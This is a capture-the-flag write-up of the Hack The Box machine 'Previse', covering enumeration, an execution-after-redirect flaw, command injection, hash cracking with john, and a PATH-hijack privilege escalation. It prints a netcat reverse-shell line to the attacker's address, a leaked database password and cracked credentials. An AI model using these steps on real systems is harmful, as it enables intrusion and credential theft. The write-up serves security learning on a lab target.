---
title: "Hack The Box - Previse"
date: 2023-02-08T22:18:53+00:00		
categories:
  - hackthebox
tags:
  - redteam
  - pentest
  - hackthebox
---

Hi again, today I want to share my writeup on the Easy box "Previse" from Hack The Box, it contains a web application that has broken access control which allows anyone to add a new user and download the source code of the web application. After reading the source code we know that it is vulnerable to command injection which allows us to gain RCE.

After getting our foothold, we can extact and crack password hash that is stored in the local database, and finally perform path injection to escalate our privilege.

# Enuemration

## nmap scan

```sh
└─$ sudo nmap -sC -sV -p22,80 10.10.11.104 -oA nmap/previse                                        
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 21:11 EDT
Nmap scan report for 10.10.11.104
Host is up (0.078s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.72 seconds

```

We have a HTTP server running on target, I notice the file extension is php, let's try to run gobuster with php extension.

## Gobuster result

```sh
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]
/config.php           (Status: 200) [Size: 0]                   
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/download.php         (Status: 302) [Size: 0] [--> login.php]                 
/favicon.ico          (Status: 200) [Size: 15406]                             
/files.php            (Status: 302) [Size: 4914] [--> login.php]              
/footer.php           (Status: 200) [Size: 217]                               
/header.php           (Status: 200) [Size: 980]                               
/index.php            (Status: 302) [Size: 2801] [--> login.php]              
/index.php            (Status: 302) [Size: 2801] [--> login.php]              
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/] 
/login.php            (Status: 200) [Size: 2224]                              
/logout.php           (Status: 302) [Size: 0] [--> login.php]                 
/logs.php             (Status: 302) [Size: 0] [--> login.php]                 
/nav.php              (Status: 200) [Size: 1248]                              
/server-status        (Status: 403) [Size: 277]                               
/status.php           (Status: 302) [Size: 2966] [--> login.php]            
```

We have a login page

![photo1](/assets/images/2023-02-08-htb-previse/Pasted_image_20210902211327.png)

If we try to visit the index page, we will get redirect to login.php, so what if we do not follow the redirect? This is in fact a Execution After Redirect (EAR) vulnerability, the server redirect user **AFTER** checking if he is a valid user.

https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR)


Here I use burp suite to capture the request and see what is inside the index page

![photo2](/assets/images/2023-02-08-htb-previse/Pasted_image_20210902215246.png)

# Foothold

We can use this trick to view other pages as well

In status.php, we learned that mysql server is running on target.

![photo3](/assets/images/2023-02-08-htb-previse/Pasted_image_20210902215604.png)

In accounts.php, I learned that it is possible to add a new user

![photo4](/assets/images/2023-02-08-htb-previse/Pasted_image_20210902220353.png)

Let's try to use curl to add a new user

```bash
curl -X POST http://10.10.11.104/accounts.php? --data "username=octopus&password=octopus&confirm=octopus"
```
![photo5](/assets/images/2023-02-08-htb-previse/Pasted_image_20210902220325.png)

Now we can login to it and download siteBackup.zip, it contains the source code of the web application running on the server.


We can find the database user credential in the file config.php
```php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

In file logs.php, I found an injection point where the url parameter 'delim' is passwed to the python execute() function

![photo6](/assets/images/2023-02-08-htb-previse/Pasted_image_20210902221225.png)

We can try to gain RCE from this vulnerability

![photo7](/assets/images/2023-02-08-htb-previse/Pasted_image_20210902221439.png)

Woo, we got a shell as www-data!

![photo8](/assets/images/2023-02-08-htb-previse/Pasted_image_20210902221504.png)

# User

Always check the ports, here we can find mysql is running locally

![photo9](/assets/images/2023-02-08-htb-previse/Pasted_image_20210902222302.png)

Login to mysql with the password we found in config.php

Got password hash for user m4lwhere and corrupted

![photo10](/assets/images/2023-02-08-htb-previse/Pasted_image_20210902224012.png)

Let's use john to crack it

we got the password for user corrupted ==> offset

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash
```

Got the cred! We can login to this user :)
m4lwhere:ilovecody112235!


# Priv Esc

Looking around the file system, came across an interesting script access_backup.sh. From the comment I learned that this script is possibly run by root

```sh
m4lwhere@previse:/opt/scripts$ cat access_backup.sh 
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz

```

Always good to check user privilege:)

![photo11](/assets/images/2023-02-08-htb-previse/Pasted_image_20210903001811.png)

In the script access_backup.sh the PATH of gzip is not indicated, that means we can create another file name gzip and modify the path variable to execute this file instead of the intended one.

```sh
m4lwhere@previse:/tmp$ cat gzip
#!/bin/sh
nc -e /bin/bash 10.10.14.4 4444
m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh
```

rooted, ggs.
![photo12](/assets/images/2023-02-08-htb-previse/Pasted_image_20210903005910.png)